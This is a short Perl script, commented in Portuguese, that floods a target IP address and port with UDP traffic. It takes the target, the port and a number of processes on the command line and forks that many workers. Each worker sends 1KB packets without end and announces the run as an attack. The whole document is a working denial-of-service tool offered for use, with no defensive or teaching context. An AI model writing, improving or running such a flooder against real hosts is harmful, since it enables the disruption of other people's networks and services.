#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;
use POSIX ':sys_wait_h';

# CONFIGURAÇÕES ===========================
my $target_ip = $ARGV[0] || die "Uso: perl udp_flood.pl <IP> <PORTA> <THREADS>\n";
my $port = $ARGV[1] || 80;
my $threads = $ARGV[2] || 10;

my $payload = "X" x 1024; # Pacote de 1KB
# =========================================

print "[*] Iniciando ataque em $target_ip:$port com $threads processos...\n";

for (1 .. $threads) {
    my $pid = fork();
    if ($pid == 0) {
        flood();
        exit(0);
    }
}

# Espera processos filhos (não obrigatório, mas evita zumbis)
$SIG{CHLD} = sub { while (waitpid(-1, WNOHANG) > 0) {} };

sub flood {
    while (1) {
        my $sock = IO::Socket::INET->new(
            PeerAddr => $target_ip,
            PeerPort => $port,
            Proto    => 'udp'
        );

        if ($sock) {
            send($sock, $payload, 0);
            print "[+] Pacote enviado para $target_ip:$port\n";
        }

        close($sock) if $sock;
    }
}
